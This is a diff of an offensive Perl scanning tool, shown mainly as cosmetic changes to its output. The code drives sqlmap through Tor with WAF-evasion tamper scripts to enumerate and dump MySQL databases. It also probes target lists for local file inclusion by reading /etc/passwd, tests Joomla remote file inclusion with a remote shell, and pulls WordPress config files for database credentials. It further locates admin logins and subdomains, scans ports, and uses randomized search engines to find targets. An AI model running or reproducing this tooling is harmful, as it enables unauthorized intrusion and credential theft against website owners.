     system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		  
 	### BEG DATABASE
 	DATABASE:; 
     print color 'yellow'; 
-    print "    [+] Do You Want To Exploit DATABASE? (Y/n): ";
+    print "[+] Do You Want To Exploit DATABASE? (Y/n): ";
     print color RESET;
     $sqldatabase=<STDIN>;
     chomp ($sqldatabase);
 	if ($sqldatabase =~ /^[Y]?$/i) {
  	  DATABASENAME:;
       print color 'yellow';
-      print "    [+] Enter DataBase Name: ";
+      print "[+] Enter DataBase Name: ";
       print color RESET;
       $databasename=<STDIN>;
       chomp ($databasename);
 	  if (!$databasename){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to Enter DataBase Name!\n";
+	    print "[+] Uppss.. you have to Enter DataBase Name!\n";
         print color RESET;
 	    goto DATABASENAME;
       };
 		
       print color 'yellow';
-      print "    [+] Checking...";
+      print "[+] Checking...";
       print color RESET;
       system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 	  ### END DATABASE
 	  ### BEG TABLES
 	  TABLESYES:;
       print color 'yellow'; 
-      print "    [+] Do You Want To Exploit Tables? (Y/n): ";
+      print "[+] Do You Want To Exploit Tables? (Y/n): ";
       print color RESET;
       $sqltableyes=<STDIN>;
       chomp ($sqltableyes);
@@ -1370,26 +1653,26 @@ sub sqlmaptor {
 	  if ($sqltableyes =~ /^[Y]?$/i) {
 		TABLES:;
         print color 'yellow';
-        print "    [+] Enter Table Name: ";
+        print "[+] Enter Table Name: ";
         print color RESET;
         $sqltables=<STDIN>;
         chomp ($sqltables);
 	    if (!$sqltables){ 
           print color 'red';
-	      print "    [+] Uppss.. you have to Enter Table Name!\n";
+	      print "[+] Uppss.. you have to Enter Table Name!\n";
           print color RESET;
 	      goto TABLES;
         };
 		
         print color 'yellow';
-        print "    [+] Checking DataBase Tables...";
+        print "[+] Checking DataBase Tables...";
         print color RESET;
 		system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 		### END TABLES
 		### BEG COLUMNS
 		COLUMNSYES:;
         print color 'yellow'; 
-        print "    [+] Do You Want To Exploit Columns? (Y/n): ";
+        print "[+] Do You Want To Exploit Columns? (Y/n): ";
         print color RESET;
         $sqlcolyes=<STDIN>;
         chomp ($sqlcolyes);
@@ -1397,19 +1680,19 @@ sub sqlmaptor {
 	    if ($sqlcolyes =~ /^[Y]?$/i) {
 		  COLS:;
           print color 'yellow';
-          print "    [+] Enter Column Name [ex: admin,users,orders]: ";
+          print "[+] Enter Column Name [ex: admin,users,orders]: ";
           print color RESET;
           $sqlcolumn=<STDIN>;
           chomp ($sqlcolumn);
 	      if (!$sqlcolumn){ 
             print color 'red';
-	        print "    [+] Uppss.. you have to Enter Column Name!\n";
+	        print "[+] Uppss.. you have to Enter Column Name!\n";
             print color RESET;
 	        goto COLS;
           };
 		
           print color 'yellow';
-          print "    [+] Checking Columns...";
+          print "[+] Checking Columns...";
           print color RESET;
           system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 	    }
@@ -1421,21 +1704,22 @@ sub sqlmaptor {
 ###################################################################		
 ##bgn sqlmap without tor 
 sub sqlmap {
-  scandetail();
+  #scandetail();
+  sleep(1);
   open (INFO, 'XSS_Site_Scan.txt');
   while (my $Target = <INFO>) {
 	chomp $Target;
 	$Target =~ s/\%.*//s;
 
     print color 'yellow';
-    print "    [+] Checking databases...";
+    print "[+] Checking databases...";
     print color RESET;
     system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 		
 	### BEG DATABASE
 	DATABASE:; 
     print color 'yellow'; 
-    print "    [+] Do You Want To Exploit DATABASE? (Y/n): ";
+    print "[+] Do You Want To Exploit DATABASE? (Y/n): ";
     print color RESET;
     $sqldatabase=<STDIN>;
     chomp ($sqldatabase);
@@ -1443,27 +1727,27 @@ sub sqlmap {
 	if ($sqldatabase =~ /^[Y]?$/i) {
 	  DATABASENAME:;
       print color 'yellow';
-      print "    [+] Enter DataBase Name: ";
+      print "[+] Enter DataBase Name: ";
       print color RESET;
       $databasename=<STDIN>;
       chomp ($databasename);
 		  
 	  if (!$databasename){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to Enter DataBase Name!\n";
+	    print "[+] Uppss.. you have to Enter DataBase Name!\n";
         print color RESET;
 	    goto DATABASENAME;
       };
 		
       print color 'yellow';
-      print "    [+] Checking...";
+      print "[+] Checking...";
       print color RESET;
       system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		
 	  ### END DATABASE
 	  ### BEG TABLES
 	  TABLESYES:;
       print color 'yellow'; 
-      print "    [+] Do You Want To Exploit Tables? (Y/n): ";
+      print "[+] Do You Want To Exploit Tables? (Y/n): ";
       print color RESET;
       $sqltableyes=<STDIN>;
       chomp ($sqltableyes);
@@ -1471,45 +1755,45 @@ sub sqlmap {
 	  if ($sqltableyes =~ /^[Y]?$/i) {
 		TABLES:;
         print color 'yellow';
-        print "    [+] Enter Table Name: ";
+        print "[+] Enter Table Name: ";
         print color RESET;
         $sqltables=<STDIN>;
         chomp ($sqltables);
 	    if (!$sqltables){ 
           print color 'red';
-	      print "    [+] Uppss.. you have to Enter Table Name!\n";
+	      print "[+] Uppss.. you have to Enter Table Name!\n";
           print color RESET;
 	      goto TABLES;
         }
 		
         print color 'yellow';
-        print "    [+] Checking DataBase Tables...";
+        print "[+] Checking DataBase Tables...";
         print color RESET;
         system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 		### END TABLES
 		### BEG COLUMNS
 		COLUMNSYES:;
         print color 'yellow'; 
-        print "    [+] Do You Want To Exploit Columns? (Y/n): ";
+        print "[+] Do You Want To Exploit Columns? (Y/n): ";
         print color RESET;
         $sqlcolyes=<STDIN>;
         chomp ($sqlcolyes);
 	    if ($sqlcolyes =~ /^[Y]?$/i) {
 		  COLS:;
           print color 'yellow';
-          print "    [+] Enter Column Name [ex: admin,users,orders]: ";
+          print "[+] Enter Column Name [ex: admin,users,orders]: ";
           print color RESET;
           $sqlcolumn=<STDIN>;
           chomp ($sqlcolumn);
 	      if (!$sqlcolumn){ 
             print color 'red';
-	        print "    [+] Uppss.. you have to Enter Column Name!\n";
+	        print "[+] Uppss.. you have to Enter Column Name!\n";
             print color RESET;
 	        goto COLS;
           }
 		
           print color 'yellow';
-          print "    [+] Checking Columns...";
+          print "[+] Checking Columns...";
           print color RESET;
           system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 	    } ### END COLUMNS
@@ -1525,21 +1809,29 @@ sub mlistLfi {
   LFI();
   countargets();
   scandetail();
-  forwait();
   open (TEXT, $listname);
   while (my $Target = <TEXT>) {
     chomp $Target;
     if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-    sleep(1);
-    print "    [+] Checking $Target\n";
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print "$Target \n";
+
+
     foreach $LFI(@LFI){
       my $URL = $Target.$LFI;
       $request = HTTP::Request->new('GET', $URL);
       $response = $ua->request($request);
       my $Source = $response->content;
 	  if ((defined $validation_txt) && ($Source =~ m/$validation_txt/i)) {
+	  
+	    print color 'bold yellow';
+	    print "[!] VULN: ";
+	    print color RESET;
+	  
 	    print color 'green';
-        print "    [!] $URL\n";
+        print "$URL\n";
 	    print color RESET;
 	    open (INFO, '>>LFI_Scan.txt');
         print INFO "$URL\n";
@@ -1547,13 +1839,25 @@ sub mlistLfi {
 	  }else{
 	    if ($Source =~ m/root:x:0:0:root:/i) {
 	      print color 'green';
-          print "    [!] $URL\n";
+          print "$URL\n";
 	      print color RESET;
 		  open (INFO, '>>LFI_Scan.txt');
           print INFO "$URL\n";
 		  close (INFO);
 	    }
       } 
+      my $URL1 = $URL;
+      $request = HTTP::Request->new('GET', $URL1);
+      $response = $ua->request($request);
+      print color 'bold yellow';
+      print "[!] INFO:   ";
+      print color RESET;
+      if($response = RC_OK){
+        print "HTTP/1.1 200 OK  ";
+        print "\n";
+      }
+      print "[ ]............................................................................ \n";
+	  
     } ### END FOREACH
   } ### END WHILE 
   finlfi();
@@ -1565,26 +1869,43 @@ sub mtLfi {
   LFI();
   Target();
   scandetail();
+  countargets();
   forwait();
+  
   foreach $LFI(@LFI){
     my $URL = $Target.$LFI;
     $request = HTTP::Request->new('GET', $URL);
     $response = $ua->request($request);
     my $Source = $response->content;
+	
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	
 	if ((defined $validation_txt) && ($Source =~ m/$validation_txt/i)) {
       print color 'green';
-      print "    [!] $URL\n";
+      print "[!] $URL\n";
 	  print color RESET;
-	}else{
-	  if ($Source =~ m/root:x:0:0:root:/i) {
-	    print color 'green';
-        print "    [!] $URL\n";
-	    print color RESET;
-	  }
-	} 
+	}elsif ($Source =~ m/root:x:0:0:root:/i) {
+	  print color 'green';
+      print "[!] $URL\n";
+	  print color RESET;
+	}
+	
+    my $URL1 = $URL;
+    $request = HTTP::Request->new('GET', $URL1);
+    $response = $ua->request($request);
+    print color 'bold yellow';
+    print "[!] INFO:   ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }  
 	open (INFO, '>>LFI_Scan.txt');
     print INFO "$URL\n";
 	close (INFO);
+    print "[ ]............................................................................ \n";
   }### END FOREACH
   finlfi();
 ############################## 
@@ -1612,16 +1933,16 @@ sub finlfi {
     open my $file, "<", "LFI_Scan.txt";
     $lc++ while <$file>;
 	print color 'yellow';
-	print "    [!] $lc Unique Result(s) Found!\n";
+	print "[!] $lc Unique Result(s) Found!\n";
 	print color RESET;
 	close $file;
 	  
 	print color 'yellow';
-    print "    [+] Results saved in $Bin LFI_Scan.txt! \n";
+    print "[+] Results saved in $Bin/LFI_Scan.txt! \n";
 	print color RESET;
   }else{ 
 	print color 'red';
-    print "    [+] No Lfi Found! \n";
+    print "[+] No Lfi Found! \n";
 	print color RESET;
   } 
   print color 'red';
@@ -1635,18 +1956,17 @@ sub mljoomrfi {
   listchekjoomrfi();
   RFI();
   mlistname();
-  countargets();
   scandetail();
-  forwait();
+  countargets();
   open (TEXT, $listname);
   while (my $Target = <TEXT>) {
 	chomp $Target;
 	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
 		
-    sleep(1);
-	print" \n";        
-    print "    [+] Checking $Target";
-	print" \n";
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print "$Target \n";
 
     foreach $RFI(@RFI){
       my $URL =$Target.$RFI.$shell;
@@ -1656,13 +1976,30 @@ sub mljoomrfi {
       my $Source = $response->content;
 
       if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){
-	    print color 'green';
-        print "    [!] $URL\n";
+	  
+	    print color 'bold yellow';
+	    print "[!] VULN: ";
 	    print color RESET;
+
+	    print color 'green';
+        print "$URL\n";
+	    print color RESET;
+		
+        my $URL1 = $URL;
+        $request = HTTP::Request->new('GET', $URL1);
+        $response = $ua->request($request);
+        print color 'bold yellow';
+        print "[!] INFO:   ";
+        print color RESET;
+        if($response = RC_OK){
+          print "HTTP/1.1 200 OK  ";
+          print "\n";
+        }  
            
         open (INFO, '>>Joom_RFI_Scan.txt');
         print INFO "$URL\n";
         close (INFO);
+        print "[ ]............................................................................ \n";
 	  }
     } ### END FOREACH
   } ## END WHILE
@@ -1674,7 +2011,7 @@ sub mtjoomrfi {
   RFI();
   Target();
   scandetail();
-  forwait();
+  countargets();
   foreach $RFI(@RFI){
     my $URL =$Target.$RFI.$shell;
 	$URL =~ s/ //g;
@@ -1682,11 +2019,26 @@ sub mtjoomrfi {
     $response = $ua->request($request);
     my $Source = $response->content;
 
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+
     if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){
 	  print color 'green';
-      print "    [!] $URL\n";
+      print "$URL\n";
 	  print color RESET;
           
+      my $URL1 = $URL;
+      $request = HTTP::Request->new('GET', $URL1);
+      $response = $ua->request($request);
+      print color 'bold yellow';
+      print "[!] INFO:   ";
+      print color RESET;
+      if($response = RC_OK){
+        print "HTTP/1.1 200 OK  ";
+        print "\n";
+      }  
+      print "[ ]............................................................................ \n";
       open (INFO, '>>Joom_RFI_Scan.txt');
       print INFO "$URL\n";
       close (INFO);
@@ -1716,16 +2068,16 @@ sub finjoomrfi {
     open my $file, "<", "Joom_RFI_Scan.txt";
     $lc++ while <$file>;
 	print color 'yellow';
-	print "    [!] $lc Unique Result(s) Found!\n";
+	print "[!] $lc Unique Result(s) Found!\n";
 	print color RESET;
 	close $file;
 	  
 	print color 'yellow';
-    print "    [!] Results saved in $Bin Joom_RFI_Scan.txt! \n";
+    print "[!] Results saved in $Bin/Joom_RFI_Scan.txt! \n";
 	 print color RESET;
   }else{ 
 	print color 'red';
-    print "    [+] No Joomla Lfi Found! \n";
+    print "[+] No Joomla Lfi Found! \n";
 	print color RESET;
   } 
   print color 'red';
@@ -1739,19 +2091,17 @@ sub mlwprfi {
   listchekwplfi();
   ADFWP();
   mlistname();
-  countargets();
   scandetail();
-  forwait();
+  countargets();
         
   open (TEXT, $listname);
   while (my $Target = <TEXT>) {
     chomp $Target;
     if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-		
-    sleep(1);
-    print" \n";        
-    print "    [+] Checking $Target";
-    print" \n";
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print "$Target \n";
         
     foreach $ADFWP(@ADFWP){
       my $URL = $Target.$ADFWP;
@@ -1759,13 +2109,29 @@ sub mlwprfi {
       $response = $ua->request($request);
       my $Source = $response->content;
       if ($response->is_success && $response->content =~ m/DB_NAME/i || m/DB_USER/i || m/localhost/i || m/DB_PASSWORD/i || m/DB_HOST/i) {
+	    print color 'bold yellow';
+	    print "[!] VULN: ";
+	    print color RESET;
+
 	    print color 'green';
-        print '    [!] ', $response->request->uri, "\n";
+        print ' ', $response->request->uri, "\n";
 	    print color RESET;
             
+        my $URL1 = $URL;
+        $request = HTTP::Request->new('GET', $URL1);
+        $response = $ua->request($request);
+        print color 'bold yellow';
+        print "[!] INFO:   ";
+        print color RESET;
+        if($response = RC_OK){
+          print "HTTP/1.1 200 OK  ";
+          print "\n";
+        }  
+			
         open (INFO, '>>WP_ADF_Scan.txt');
         print INFO "$URL\n";
         close (INFO);
+        print "[ ]............................................................................ \n";
 	  }
     }
   } ### END WHILE
@@ -1778,20 +2144,36 @@ sub mtwplfi {
   ADFWP();
   Target();
   scandetail();
+  countargets();
   forwait();
   foreach $ADFWP(@ADFWP){
     my $URL = $Target.$ADFWP;
     $request = HTTP::Request->new('GET', $URL);
     $response = $ua->request($request);
     my $Source = $response->content;
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	
     if ($response->is_success && $response->content =~ m/DB_NAME/i || m/DB_USER/i || m/localhost/i || m/DB_PASSWORD/i || m/DB_HOST/i) {
 	  print color 'green';
       print '    [!] ', $response->request->uri, "\n";
-          
 	  print color RESET;
+	  
+      my $URL1 = $URL;
+      $request = HTTP::Request->new('GET', $URL1);
+      $response = $ua->request($request);
+      print color 'bold yellow';
+      print "[!] INFO:   ";
+      print color RESET;
+      if($response = RC_OK){
+        print "HTTP/1.1 200 OK  ";
+        print "\n";
+      }  
       open (INFO, '>>WP_ADF_Scan.txt');
       print INFO "$URL\n";
       close (INFO);
+      print "[ ]............................................................................ \n";
 	}
   }
   finwpadf();
@@ -1820,16 +2202,16 @@ sub finwpadf {
     open my $file, "<", "WP_ADF_Scan.txt";
     $lc++ while <$file>;
 	print color 'yellow';
-	print "    [!] $lc Unique Result(s) Found!\n";
+	print "[!] $lc Unique Result(s) Found!\n";
 	print color RESET;
 	close $file;
 
 	print color 'yellow';
-    print "    [!] Results saved in $Bin WP_ADF_Scan.txt! \n";
+    print "[!] Results saved in $Bin/WP_ADF_Scan.txt! \n";
 	print color RESET;
   }else{ 
 	print color 'red';
-    print "    [+] No Wordpress Lfi Found! \n";
+    print "[+] No Wordpress Lfi Found! \n";
 	print color RESET;
   } 
   print color 'red';
@@ -1843,18 +2225,18 @@ sub mladmin {
   listchekadmin();
   ADMIN();
   mlistname();
-  countargets();
   scandetail();
-  forwait();
+  countargets();
 
   open (TEXT, $listname);
   while (my $Target = <TEXT>) { ###
 	chomp $Target;
 	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
 		
-	print" \n";        
-    print "    [+] Checking $Target";
-	print" \n";
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print "$Target \n";
         
     foreach $ADMIN(@ADMIN){
       my $URL =$Target.$ADMIN;
@@ -1863,22 +2245,38 @@ sub mladmin {
       $response = $ua->request($request);
       my $Source = $response->content;
 	  if ((head($URL)) && ($Source =~ m/login/i || m/password/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i)){
+	  
+	    print color 'bold yellow';
+	    print "[!] VULN: ";
+	    print color RESET;
+
         if ( $response->is_success and $response->previous ) {
 	      print color 'green';
-          print '    [!] ', $request->url, ' REDITECT TO: ', "\n";
+          print '[!] ', $request->url, ' REDITECT TO: ', "\n";
 	      print color RESET;
 	      print color 'green';
-		  print '        => ', $response->request->uri, "\n";
+		  print '  => ', $response->request->uri, "\n";
 	      print color RESET;
 	    } else {
 	      print color 'green';
-          print '    [!] ',$response->request->uri, "\n";
+          print '[!] ',$response->request->uri, "\n";
 	      print color RESET;
 	    }
 		$ul = $response->request->uri,;
+        my $URL1 = $ul;
+        $request = HTTP::Request->new('GET', $URL1);
+        $response = $ua->request($request);
+        print color 'bold yellow';
+        print "[!] INFO:   ";
+        print color RESET;
+        if($response = RC_OK){
+          print "HTTP/1.1 200 OK  ";
+          print "\n";
+        }  
         open (INFO, '>>Admin_page.txt');
         print INFO  "$ul\n";
 	    close (INFO);
+        print "[ ]............................................................................ \n";
 	  }
     }
 	close (TXT);
@@ -1893,6 +2291,10 @@ sub mtadmin {
   Target();
   scandetail();
   forwait();
+  print color 'yellow';
+  print "[!] Please Wait...\n";
+  print color RESET;
+  
       
   foreach $ADMIN(@ADMIN){
     my $URL = $Target.$ADMIN;
@@ -1900,22 +2302,39 @@ sub mtadmin {
     $response = $ua->request($request);
     my $Source = $response->content;
 	if ((head($URL)) && ($Source =~ m/login/i || m/password/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i)){
+	  print color 'bold yellow';
+	  print "[!] TARGET:";
+	  print color RESET;
+
       if ( $response->is_success and $response->previous ) {
 	    print color 'green';
-        print '    [!] ', $request->url, ' REDITECT TO: ', "\n";
+        print ' ', $request->url, ' REDITECT TO: ', "\n";
 	    print color RESET;
 	    print color 'green';
-		print '        => ', $response->request->uri, "\n";
+		print '  => ', $response->request->uri, "\n";
 	    print color RESET;
 	  } else {
 	    print color 'green';
-        print '    [!] ',$response->request->uri, "\n";
+        print '[!] ',$response->request->uri, "\n";
 	    print color RESET;
 	  }
 	  $ul = $response->request->uri,;
+	  
+      my $URL1 = $ul;
+      $request = HTTP::Request->new('GET', $URL1);
+      $response = $ua->request($request);
+      print color 'bold yellow';
+      print "[!] INFO:   ";
+      print color RESET;
+      if($response = RC_OK){
+        print "HTTP/1.1 200 OK  ";
+        print "\n";
+      }  
+	  
       open (INFO, '>>Admin_page.txt');
       print INFO  "$ul\n";
 	  close (INFO);
+    print "[ ]............................................................................ \n";
 	}
   }
   finadmin();
@@ -1943,16 +2362,16 @@ sub finadmin {
     open my $file, "<", "Admin_page.txt";
     $lc++ while <$file>;
 	print color 'yellow';
-	print "    [!] $lc Unique Result(s) Found!\n";
+	print "[!] $lc Unique Result(s) Found!\n";
 	print color RESET;
 	close $file;
 	  
 	print color 'green';
-    print "    [!] Results saved in $Bin Admin_page.txt! \n";
+    print "[!] Results saved in $Bin/Admin_page.txt! \n";
 	print color RESET;
   }else{ 
 	print color 'red';
-    print "    [+] No Admin Page Login Found! \n";
+    print "[+] No Admin Page Login Found! \n";
 	print color RESET;
   } 
   print color 'red';
@@ -1978,8 +2397,10 @@ sub mlsubdomain {
 	if (index($Target, 'www.') != -1) {
 	  $Target =~ s/www.//g;
 	}
-    print "    [+] Checking $Target\n";
-    print color RESET;
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print "$Target \n";
 
 	foreach $SUBDOMAIN(@SUBDOMAIN){	
 	  my $URL = $SUBDOMAIN.$Target;
@@ -1988,13 +2409,26 @@ sub mlsubdomain {
       Proto=>'icmp',
       timeout=>1);
 	  if ($socket ne "") { 
-	    print color 'green';
-        print "    [+] http//:$URL\n";
+	  
+	    print color 'bold yellow';
+	    print "[!] TARGET: ";
 	    print color RESET;
-
-		open (INFO, '>>Subdomains_Scan.txt');
-        print INFO "http//:$URL\n";
-		close (INFO);
+	
+	    print color 'green';
+        print "http://$URL\n";
+	    print color RESET;
+	  
+        my $URL1 = "http://$URL";
+        $request = HTTP::Request->new('GET', $URL1);
+        $response = $ua->request($request);
+        print color 'bold yellow';
+        print "[!] INFO:   ";
+        print color RESET;
+        if($response = RC_OK){
+          print "HTTP/1.1 200 OK  ";
+          print "\n";
+        }
+        print "[ ]............................................................................ \n";
 	  }	
 	}
   }
@@ -2004,26 +2438,49 @@ sub mlsubdomain {
 #################################################################      
 sub mtsubdomain {
   listchekadmin();
-  ADMIN();
+  SUBDOMAIN();
   Target();
   scandetail();
   forwait();
+
+	if (index($Target, 'http://www.') != -1) {
+	  $Target =~ s/http:\/\/www.//g;
+	}
+	if (index($Target, 'www.') != -1) {
+	  $Target =~ s/www.//g;
+	}
 
   foreach $SUBDOMAIN(@SUBDOMAIN){	
   my $URL = $SUBDOMAIN.$Target;
 	my $socket=IO::Socket::INET->new(
     PeerAddr=>"$URL",
     Proto=>'icmp',
-    timeout=>1);
+    timeout=>1);	
 	if ($socket ne "") { 
-	  print color 'green';
-      print "    [+] http//:$URL\n";
+	  print color 'bold yellow';
+	  print "[!] TARGET: ";
 	  print color RESET;
+	
+	  print color 'green';
+      print "http://$URL\n";
+	  print color RESET;
+	  
+      my $URL1 = "http://$URL";
+      $request = HTTP::Request->new('GET', $URL1);
+      $response = $ua->request($request);
+      print color 'bold yellow';
+      print "[!] INFO:   ";
+      print color RESET;
+      if($response = RC_OK){
+        print "HTTP/1.1 200 OK  ";
+        print "\n";
+      }  
 
 	  open (INFO, '>>Subdomains_Scan.txt');
-      print INFO "http//:$URL\n";
+      print INFO "http://$URL\n";
 	  close (INFO);
-	}	
+    print "[ ]............................................................................ \n";
+	}
   }
   finsubdomain();
 }
@@ -2050,16 +2507,16 @@ sub finsubdomain {
     open my $file, "<", "Subdomains_Scan.txt";
     $lc++ while <$file>;
 	print color 'yellow';
-	print "    [!] $lc Unique Result(s) Found!\n";
+	print "[!] $lc Unique Result(s) Found!\n";
 	print color RESET;
 	close $file;
 	  
 	print color 'yellow';
-    print "    [!] Results saved in $Bin Subdomains_Scan.txt! \n";
+    print "[!] Results saved in $Bin/Subdomains_Scan.txt! \n";
 	print color RESET;
   }else{
     print color 'red';
-    print "    [!] No Subdomains Found!\n";
+    print "[!] No Subdomains Found!\n";
     print color RESET;
   }
 	  
@@ -2073,7 +2530,7 @@ sub finsubdomain {
 sub finports {
   after6:;
   print color 'yellow';
-  print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+  print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
   print color RESET;
   $after6=<STDIN>;
   chomp ($after6);
@@ -2082,13 +2539,13 @@ sub finports {
   }
   if ($after6==0) {
     print color 'red';
-    print "    [!] Have A Good Time! Bye.\n";
+    print "[!] Have A Good Time! Bye.\n";
 	print color RESET;
     exit;
   }
   if ($after6 != 1 or 0) {
 	print color 'red';
-    print "    [!] Upsss.. Invalid Option!\n";
+    print "[!] Upsss.. Invalid Option!\n";
 	print color RESET;
     sleep(1);
     goto after6;
@@ -2106,7 +2563,10 @@ sub basic {
   open (TEXT, "servers.txt");
   while (my $Target = <TEXT>) { ###
 	chomp $Target;
-    print "    [+] Checking $Target \n";
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print "$Target \n";
 
 	$Target=$Target;
 	sleep(1);
@@ -2117,8 +2577,8 @@ sub basic {
       close $socket;
       if ($closed1==0){
 	    print color 'green';
-        print "\n    [!] Open '$type' Port -> ";
-        print "$port1";
+        print "[!] Open '$type' Port -> ";
+        print "$port1\n";
 		print color RESET;
       }
       $closed1=0;
@@ -2141,7 +2601,10 @@ sub basic2 {
   open (TEXT, "servers.txt");
   while (my $Target = <TEXT>) { ###
 	chomp $Target;
-    print "    [+] Checking $Target \n";
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print "$Target \n";
 
 	$Target=$Target;
     $closed2=0;
@@ -2154,8 +2617,8 @@ sub basic2 {
       close $socket2;
       if ($closed2==0){
 	    print color 'green';
-        print "\n    [!] Open TCP Port -> ";
-        print "$port2";
+        print "[!] Open TCP Port -> ";
+        print "$port2\n";
 		print color RESET;
       }
       if ($closed3==0){
@@ -2186,7 +2649,10 @@ sub complete {
   open (TEXT, "servers.txt");
   while (my $Target = <TEXT>) { ###
 	chomp $Target;
-    print "    [+] Checking $Target \n";
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print "$Target \n";
 
 	$Target=$Target;
 	sleep(1);
@@ -2197,8 +2663,8 @@ sub complete {
       close $socket;
       if ($closed3==0){
 	    print color 'green';
-        print "\n    [!] Open $type2 Port -> ";
-        print "$port3";
+        print "[!] Open $type2 Port -> ";
+        print "$port3\n";
 		print color RESET;
       }
 	}
@@ -2222,7 +2688,10 @@ sub complete2 {
   open (TEXT, "servers.txt");
   while (my $Target = <TEXT>) { ###
 	chomp $Target;
-    print "    [+] Checking $Target \n";
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print "$Target \n";
 
 	$Target=$Target;
 	sleep(1);
@@ -2236,15 +2705,15 @@ sub complete2 {
       close $socket2;
       if ($closed4==0){
 	    print color 'green';
-        print "\n    [!] Found TCP An Open Port -> ";
-        print "$port4";
+        print "[!] Found TCP An Open Port -> ";
+        print "$port4\n";
 	    print color RESET;
       }
 
       if ($closed5==0){
 	    print color 'green';
-        print "\n    [!] Found UDP An Open Port -> ";
-        print "$port4";
+        print "[!] Found UDP An Open Port -> ";
+        print "$port4\n";
 	    print color RESET;
       }
     }
@@ -2287,7 +2756,10 @@ sub user {
   open (TEXT, "servers.txt");
   while (my $Target = <TEXT>) {
 	chomp $Target;
-    print "    [+] Checking $Target \n";
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print "$Target \n";
 
 	$Target=$Target;
 	sleep(1);
@@ -2297,8 +2769,8 @@ sub user {
       close $socket;
       if ($closed6==0){
 	    print color 'green';
-        print "\n    [!] Open $type3 Port -> ";
-        print "$mstart";
+        print "[!] Open $type3 Port -> ";
+        print "$mstart\n";
 		print color RESET;
       }
       $closed6=0;
@@ -2323,7 +2795,10 @@ sub user2 {
   open (TEXT, "servers.txt");
   while (my $Target = <TEXT>) { ###
 	chomp $Target;
-    print "    [+] Checking $Target \n";
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print "$Target \n";
 
 	$Target=$Target;
 	sleep(1);
@@ -2336,14 +2811,14 @@ sub user2 {
       close $socket;
       if ($closed7==0){
 	    print color 'green';
-        print "\n    [!] Open TCP Port -> ";
-        print "$mstart";
+        print "[!] Open TCP Port -> ";
+        print "$mstart\n";
         print color RESET;
       }  
       if ($closed8==0){
 	    print color 'green';
-        print "\n    [!] Open UDP Port -> ";
-        print "$mstart";
+        print "[!] Open UDP Port -> ";
+        print "$mstart\n";
 	    print color RESET;
       }
       $closed7=0;
@@ -2361,7 +2836,7 @@ sub user2 {
 ##############################################################
 sub submsites {
   server();
-  $mpages = $mpages;
+  $mlevel = $mlevel;
   msites();
 }
 
@@ -2374,21 +2849,27 @@ sub msites {
   my @strings=('fr', 'it', 'ie', 'us', 'br', 'ma', 'dz', 'se', 'nl', 'il', 'ca', 'pt', 'pl', 'eg', 'tn', 'ae', 'qa', 'af', 'iq', 'ch', 'mx', 've', 'es', 'ro', 'ru', 'jp', 'id', 'de', 'ua', 'sa', 'ok', 'fi', 'no', 'cz', 'lu', 'uy');
   my $myrand = $strings[int rand @strings];
   print color 'bold yellow';
-  print "    [+] Random Search:: BING [". $myrand . "]\n";
   scandetail();
+  print color 'bold yellow';
+  print "[+] RANDOM SEARCH:: ";
+  print color RESET;
+  print color 'red';
+  print "BING [bing.". $myrand . "]\n";
+  print color RESET;
+  print color 'bold';
+  print "[ ] ---------------------------------------------------------------------------\n";
+  print color RESET;
   forwait();
-	
+
